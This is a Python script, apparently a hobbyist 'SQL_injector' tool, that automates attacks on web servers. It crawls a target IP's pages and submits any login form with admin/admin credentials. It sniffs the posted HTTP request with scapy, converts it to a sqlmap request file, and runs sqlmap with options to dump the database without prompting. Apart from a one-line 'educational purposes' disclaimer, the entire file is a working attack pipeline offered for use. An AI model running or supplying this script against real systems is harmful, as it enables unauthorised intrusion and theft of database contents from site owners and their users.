#!/bin/python3

import scapy.all as sc
import base64
import os
import mechanicalsoup
import re
import sys
import subprocess
from threading import Thread
from time import sleep
import argparse

def decode_request(RAW_string):
    #Create empty dict that will store all request params
    load_dict = {}

    # Split body and change it to a dictionary so that all parameters can be easily acessible
    for i,x in enumerate(RAW_string.split('\n')[1:-2]):
        splitted = x.split()
        if splitted != []:
            load_dict[splitted[0]] = " ".join(splitted[1:])

    return load_dict
#

def sniff_and_inject(ip_address, timeout, path_to_sqlmap, port):
    #Starting sniffing the network in scapy
    print("Sniffing on the go, now access vulnerable webpage and do the job.")
    results = sc.sniff(filter="dst net "+ip_address, timeout=timeout)

    # Exit program if no packets were intercepted - they are needed for sqlmap
    if len(results) == 0:
        print('Scapy have not intercepted any packets. Try again. Exiting.....')
        exit()

    #Create table of intercepted packets,
    r_table = []
    load_index = 0
    packet_load = b''

    print(results)

    for i,x in enumerate(results):
        r_table.append(x.summary())
        #Check which packet contains the HTTP request
        if 'Raw' in x.summary():
            # Just to omit first payload, which is typically GET request
            if 'GET' not in x.load.decode():
                packet_load += x.load


    if packet_load == b'':
        print('No RAW payloads found. Are trying to hack webpage containing form with user and password fields?')
        exit()

    #Decode intercepted packet into easily accessible set of variables
    load_dict = decode_request(packet_load.decode())

    #Save parameters into a new file with format acceptable by sqlmap
    save_to_sqlmapfile(load_dict, packet_load)

    #Possible sqlmap paths:
    # /usr/share/sqlmap/sqlmap.py
    # /usr/share/golismero/plugins/testing/attack/sqlmap.py
    # /usr/share/golismero/tools/sqlmap/sqlmap.py
    # /usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py

    #Finally run sqlinjection with all parameters (note - sqlmap_params.xml has automatically been written to before)
    print('Data saved. Now running sqlmap with acquired parameters: ','\n','-'*50,'\n')
    #subprocess.call(['gnome-terminal','--',path_to_sqlmap,' ','-r ','sqlmap_params.xml ','--dump ', '--batch ', '--answer="redirect=N" '])
    os.system(path_to_sqlmap+' -r sqlmap_params.xml --dump --batch --answer="redirect=N"')
    try:
        print(subprocess.check_output([path_to_sqlmap, ' -r sqlmap_params.xml --dump --batch --answer="redirect=N"']))
    except subprocess.CalledProcessError as err:
        print(err+ "\n\nYou need to manually add sqlmap.py path (-a option). Check the program help.","\nLocate sqlmap: \n","# locate sqlmap | grep sqlmap.py")

    print('sqlmap finished. Results above.....','\n','-'*50,'\n')
#

def save_to_sqlmapfile(load_dict, packet_load):

    #XML format for sqlmap read
    sqlmap_string ="""
    <item>
        <url><![CDATA[{0}]]></url>
        <host ip="{1}">{1}</host>
        <port>{2}</port>
        <protocol>http</protocol>
        <method><![CDATA[{3}]]></method>
        <path><![CDATA[{4}]]></path>
        <extension>{5}</extension>
        <request base64="true"><![CDATA[{6}]]></request>
    </item>
    """

    #Bytes into readable string
    RAW_string = packet_load.decode()

    #Divide packet into main sections
    dec_header = RAW_string.split('\n')[0]
    dec_res = RAW_string.split('\n')[1:-2]
    dec_param = RAW_string.split('\n')[-1]

    #Get parameters needed to code SQLmap friendly format
    url = load_dict['Referer:']
    ip = load_dict['Host:']
    method = dec_header.split()[0]
    path = dec_header.split()[1]
    extension = "php"
    load_b64 = base64.b64encode(packet_load).decode()

    #Save to sqlmap friendly file
    file_sqlmap = open('sqlmap_params.xml','w+')
    file_sqlmap.write(sqlmap_string.format(url, ip, port, method, path, extension, load_b64))
    file_sqlmap.close()
#

#Function which looks for 'form' keyword in a page to submit it
def submit_form(page, browser, delay):
    sleep(delay)
    print("Found <form> markup in the page.")
    print("Getting form fields...")

    #Select only fragment of page containing form
    form = page[page.index('<form'):page.index('</form>')].split("\n")

    #Gather all input names into a list
    form_names=[]
    for y in form:
        searchObj = re.search( r' name="(.*?)"(.*?)', y)
        if searchObj:
            form_names.append(str(searchObj.group()).split('"')[-2])

    #Select the only form o a page
    browser.select_form('form')

    # specify username and password
    # Need to search string *user* and *pass* in form fields, because
    # forms can contain other names as well
    if len(form_names) >= 2:
        for i,name in enumerate(form_names):
            if 'user' in name.lower():
                username = form_names[i]
            if 'pass' in name.lower():
                password = form_names[i]

        browser[username] = 'admin'
        browser[password] = 'admin'
        #submit form
        response = browser.submit_selected()
        return 0

    return 1
#

#Page which looks for links in a page to follow them
def get_hrefs(page, f_links):
    for y in page.split('\n'):
        searchObj = re.search( r'(.*?)href="(.*?)"(.*?)', y)
        if searchObj:
            f_links.append(str(searchObj.group()).split('"')[-2])
#

#Just checking if page contains form, some links (hrefs), or nothing
def check_webpage(page):
    f_links = []
    if 'form' in page:
        return 0
    elif 'href' in page:
        f_links = []
        get_hrefs(page, f_links)
        return f_links
    else:
        return 1
#

if __name__ == "__main__":

    #Creating parser for commandline arguments
    parser = argparse.ArgumentParser(
    description="""
        Scipt to automate sql injection process. Only for educational purposes. Use -h for help.
        Example usage:
        ./SQL_injector -i 127.0.0.1 -p 80 8181
                """
    )

    parser.add_argument('-i','--ip_address', metavar='<X.X.X.X>',default='127.0.0.1', type=str,
                    help='Target IPv4 address', required=True)
    parser.add_argument('-p','--ports', metavar='ports' ,default=[80,], type=int, nargs='+',
                help='Ports running web servers to be attacked', required=False)
    parser.add_argument('-t','--timeout', metavar='<seconds>',default=3, type=int,
                help='Timeout of sniffing by scapy (advanced)',required=False)
    parser.add_argument('-a','--path', metavar='<path_to_sqlmap>',default='/usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py', type=str,
            help='Timeout of sniffing by scapy (advanced)',required=False)
    parser.add_argument('-m','--manual', default=False, action='store_true',
            help='Does not scan any servers, just running sniffing packets. You manually enter webpage, and script starts sqlmap')

    #Parse commandline arguments
    args = parser.parse_args()

    # Default settings
    ports = args.ports
    ip_address = args.ip_address
    timeout = args.timeout
    delay = 1 #This is for threading comfort. Sniffing must have time to start before web will be accessed
    path_to_sqlmap= args.path
    #

    # If user decided to do manual injection
    if args.manual == True:
        for port in ports:
            print('Starting sniffing. Port accessed on webserver is: ',port)
            sniff_and_inject(ip_address, timeout, path_to_sqlmap, port)


        exit()


    #Open page on desired port
    for port in ports:
        web_link = 'http://' + ip_address +':'+ str(port) + '/'

        # open url in new browser
        browser = mechanicalsoup.StatefulBrowser()
        browser.open(web_link)
        page = str(browser.get_current_page())

        answer = check_webpage(page)

        if answer == 1:
            print("Nothing interesting on ",port," port. Dead end.")
        if answer == 0:
            Tsubmit = Thread(target=sniff_and_inject, args=(ip_address, timeout, path_to_sqlmap, port))
            Tsubmit.start()
            submit_form(page,browser,delay)
            #sniff_and_inject(ip_address, timeout, path_to_sqlmap)
            Tsubmit.join()
        #NOTE - this script assumes that maximal level of recursion
        #(getting into sublevels) is two.
        if type(answer) == type([]):
            #Visiting each of found links
            for subpage in answer:
                try:
                    browser.open(web_link+subpage)
                except mechanicalsoup.utils.LinkNotFoundError:
                    print('Mechanicalsoup: Link not found!')
                else:
                    s_page = str(browser.get_current_page())
                    answer = check_webpage(s_page)

                    if answer == 1:
                        print("Nothing interesting in ",subpage,". Dead end.")
                    if answer == 0:
                        Tsubmit = Thread(target=submit_form, args=(s_page,browser,delay))
                        Tsubmit.start()
                        sniff_and_inject(ip_address, timeout, path_to_sqlmap, port)
                        Tsubmit.join()
#
